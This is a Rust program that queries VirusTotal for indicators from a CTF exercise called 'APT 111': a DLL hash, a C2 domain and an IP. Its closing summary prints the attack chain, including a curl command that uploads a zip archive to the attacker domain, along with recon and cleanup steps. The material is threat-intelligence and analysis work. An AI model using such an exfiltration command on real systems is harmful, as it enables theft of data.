use std::env;
use tokio::time::{sleep, Duration};
use virustotal_rs::{ApiTier, ClientBuilder, VoteVerdict};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Get API key from environment variable
    let api_key = env::var("VTI_API_KEY").expect("VTI_API_KEY environment variable not set");

    println!("Using API key from VTI_API_KEY environment variable");

    // Create client with public tier
    let client = ClientBuilder::new()
        .api_key(api_key)
        .tier(ApiTier::Public)
        .build()?;

    // Resources from the CTF
    let dll_hash = "02032ea322036e66f2825a0342979ad942ad5e201a674dc1c0085617467d661c"; // 7z.dll
    let domain = "office.msftupdated.com";
    let ip = "35.208.137.212";

    println!("\n{}", "=".repeat(60));
    println!("📊 CHECKING EXISTING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));
    println!("\n⚠️  Note: Daily quota may be exceeded. Trying read-only operations...");

    // Check file
    println!("\n🔍 7z.dll ({})", &dll_hash[..16]);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await; // Rate limit safety

    match client.files().get(dll_hash).await {
        Ok(file) => {
            println!("  ✅ File data retrieved");
            if let Some(votes) = &file.object.attributes.total_votes {
                println!(
                    "  📊 Votes: {} malicious, {} harmless",
                    votes.malicious, votes.harmless
                );
            }
            if let Some(stats) = &file.object.attributes.last_analysis_stats {
                println!(
                    "  🔍 Detection: {}/{} engines flagged as malicious",
                    stats.malicious,
                    stats.malicious + stats.suspicious + stats.harmless + stats.undetected
                );
            }
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }

    // Check domain
    println!("\n🌐 Domain: {}", domain);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await; // Rate limit safety

    match client.domains().get(domain).await {
        Ok(domain_data) => {
            println!("  ✅ Domain data retrieved");
            if let Some(votes) = &domain_data.object.attributes.total_votes {
                println!(
                    "  📊 Votes: {} malicious, {} harmless",
                    votes.malicious, votes.harmless
                );
            }
            if let Some(stats) = &domain_data.object.attributes.last_analysis_stats {
                println!(
                    "  🔍 Detection: {}/{} engines",
                    stats.malicious + stats.suspicious,
                    stats.malicious + stats.suspicious + stats.harmless + stats.undetected
                );
            }
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }

    // Check IP
    println!("\n🌐 IP Address: {}", ip);
    println!("  Checking existing data...");
    sleep(Duration::from_secs(15)).await; // Rate limit safety

    match client.ip_addresses().get(ip).await {
        Ok(ip_data) => {
            println!("  ✅ IP data retrieved");
            if let Some(votes) = &ip_data.object.attributes.total_votes {
                println!(
                    "  📊 Votes: {} malicious, {} harmless",
                    votes.malicious, votes.harmless
                );
            }
            if let Some(stats) = &ip_data.object.attributes.last_analysis_stats {
                println!(
                    "  🔍 Detection: {}/{} engines",
                    stats.malicious + stats.suspicious,
                    stats.malicious + stats.suspicious + stats.harmless + stats.undetected
                );
            }
            println!(
                "  📍 Location: {:?} (AS{:?} - {:?})",
                ip_data.object.attributes.country,
                ip_data.object.attributes.asn,
                ip_data.object.attributes.as_owner
            );
        }
        Err(e) => println!("  ❌ Error: {}", e),
    }

    println!("\n{}", "=".repeat(60));
    println!("📌 CTF APT 111 Summary");
    println!("{}", "=".repeat(60));
    println!("\n🎯 Attack Chain:");
    println!("  1. DLL Side-loading: 7z.dll");
    println!("  2. Data Collection: ipconfig, netstat, tasklist, net commands");
    println!("  3. Archiving: zip.exe 1.zip 1.txt");
    println!("  4. Exfiltration: curl -F file=@1.zip https://office.msftupdated.com");
    println!("  5. Cleanup: rm 1.txt, rm 1.zip");
    println!("\n📊 Infrastructure:");
    println!("  • C2 Domain: office.msftupdated.com");
    println!("  • C2 IP: 35.208.137.212 (Google Cloud)");
    println!("  • Malware: 7z.dll (SHA256: {})", &dll_hash[..32]);

    Ok(())
}
